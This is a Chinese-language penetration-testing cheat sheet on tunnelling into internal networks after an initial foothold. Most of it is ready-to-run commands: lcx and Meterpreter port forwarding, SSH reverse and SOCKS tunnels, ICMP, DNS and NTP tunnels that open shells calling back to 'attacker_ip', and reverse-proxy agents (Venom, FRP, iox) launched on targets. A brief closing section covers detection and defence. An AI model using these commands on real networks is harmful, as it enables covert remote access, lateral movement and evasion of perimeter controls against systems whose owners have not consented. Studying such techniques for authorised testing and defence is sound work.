# 内网通道构建

内网通道构建是在获得内网入口后，建立稳定的访问通道，使攻击流量能够穿透网络边界到达目标网络。本文档涵盖各类隧道搭建技术。

## 2 端口转发与重定向

### 2.1 LCX (Windows)

```cmd
# 正向端口转发 - 将本地端口转发到远程
lcx.exe -tran 8080 192.168.1.100 3389

# 反向端口转发 - 将远程端口转发到本地
lcx.exe -slave attacker_ip 8080 target_ip 3389

# 监听模式
lcx.exe -listen 8080 3389
```

### 2.2 portfwd (Metasploit)

```meterpreter
# 添加端口转发
portfwd add -l 3389 -p 3389 -r target_ip

# 查看转发规则
portfwd

# 删除转发规则
portfwd delete -l 3389
```

### 2.3 SSH隧道

```bash
# 正向代理 - 访问远程内网服务
ssh -L 8080:remote_host:80 user@gateway -N
# 访问本地8080端口相当于访问remote_host的80端口

# 反向代理 - 将内网服务暴露到外网
ssh -R 8080:local_host:80 user@gateway -N
# gateway的8080端口转发到本地的80端口

# 动态SOCKS代理
ssh -D 1080 user@gateway -N
# 本地1080端口建立SOCKS代理

# 跳板连接
ssh -J user1@gateway1,user2@gateway2 target
```

### 2.4 网络层隧道

#### ICMP隧道

```bash
# p1ngp0ng 利用
# 在攻击者机器上监听
./p1ngp0ng_server_linux_amd64 -lport 443

# 在目标机器上连接
# Windows: p1ngp0ng_client.exe -s attacker_ip -p 443
# Linux: ./p1ngp0ng_client_linux_amd64 -s attacker_ip -p 443

# 使用icmpsh
# 攻击者
icmpsh_m -t 10.0.0.22 -r 10.0.0.11

# 目标
python icmpsh_m.py 10.0.0.22 10.0.0.11
```

#### DNS隧道

```bash
# DNShell - DNS隧道工具
# 服务端 (攻击者)
python DNShell.py -l -t 53 -d yourdomain.com

# 客户端 (目标)
python DNShell.py -c -t attacker_ip -d yourdomain.com

# 进行交互式shell
dnshell> shell

# 简单DNS隧道
dns2tcp -c -l 8080 -r 192.168.1.100:3389 -s DNS服务器
```

#### NTP隧道

```bash
# NTPShell
# 服务端
python NTPShell.py server

# 客户端
python NTPShell.py client <server_ip>
```

## 3 代理工具

### 3.1 正向代理

#### 3proxy

```bash
# 配置 /etc/3proxy.cfg
#!/usr/local/etc/3proxy
daemon
log /var/log/3proxy.log
auth none
allow *
# HTTP代理
proxy -p3128
# SOCKS代理
socks -p1080
# 端口转发
d transparent 192.168.1.100 3389 127.0.0.1 3389
```

### 3.2 反向代理

#### Venom

```bash
# 攻击者启动监听
./Venom -lport 9999

# 目标机器连接
# Windows
Venom.exe -rhost attacker_ip -rport 9999
# Linux
./agent -rhost attacker_ip -rport 9999

# 在攻击者端添加节点
show
goto 1
goto 2

# 在节点上建立隧道
socks 1080
```

### 3.3 FRP (反向代理工具)

```bash
# frps.ini (服务器端)
[common]
bind_port = 7000
token = password

# frpc.ini (客户端)
[common]
server_addr = attacker_ip
server_port = 7000
token = password

[ssh]
type = tcp
local_ip = 127.0.0.1
local_port = 22
remote_port = 6000

[http_proxy]
type = tcp
local_ip = 127.0.0.1
local_port = 8080
remote_port = 8080
```

### 3.4 iox (端口转发+代理)

```bash
# 攻击者
iox.exe listener -l 8888 -l 1080

# 目标
iox.exe client -r attacker_ip -l 8888
```

## 4 SOCKS代理

### 4.1 Metasploit SOCKS

```meterpreter
# 使用 Metasploit 的 socks4a 模块
use auxiliary/server/socks4a
set srvhost 0.0.0.0
set srvport 1080
run

# 或者使用 Metasploit 的 socks5 模块
use auxiliary/server/socks5
set srvhost 0.0.0.0
set srvport 1080
run
```

### 4.2 Shadowsocks

```bash
# 服务端配置
{
    "server": "0.0.0.0",
    "server_port": 8388,
    "password": "password",
    "method": "aes-256-cfb"
}

# 客户端配置
{
    "server": "attacker_ip",
    "server_port": 8388,
    "local_address": "127.0.0.1",
    "local_port": 1080,
    "password": "password",
    "method": "aes-256-cfb"
}
```

### 4.3 通过代理链使用工具

```bash

echo "http 127.0.0.1 1080" > /etc/proxychains.conf

# 通过代理运行命令
proxychains nmap -sT -Pn target_ip
proxychains curl http://target.com
```

## 6 隧道检测与防御

### 6.1 隧道检测方法

```bash
# 检查异常流量
# ICMP隧道特征 - 大量ICMP包或异常大小的ICMP包
tcpdump -i eth0 "icmp"

# DNS隧道特征 - TXT记录查询，大量异常DNS请求
tcpdump -i eth0 "udp port 53"

# 检查网络连接
netstat -tunp | grep -E "ESTABLISHED|TIME_WAIT"
ss -tunp

# 流量分析
# WireShark 抓包分析
# 异常协议特征识别
```

### 6.2 防御措施

```text
1. 网络层防御
   - 防火墙过滤ICMP，只允许必要的ICMP包
   - 禁用外部ICMP请求
   - 监控ICMP流量异常

2. DNS层防御
   - 启用DNS日志监控
   - 检测异常TXT记录或大量DNS查询
   - 限制DNS解析频率

3. 传输层防御
   - 防火墙过滤非常用端口
   - 只开放必要的出站端口

4. 检测工具
   - IDS/IPS 检测隧道流量
   - 网络流量分析工具
   - 端点检测工具

5. 最佳实践
   - 网络分段
   - 最小权限原则
   - 定期安全审计
```
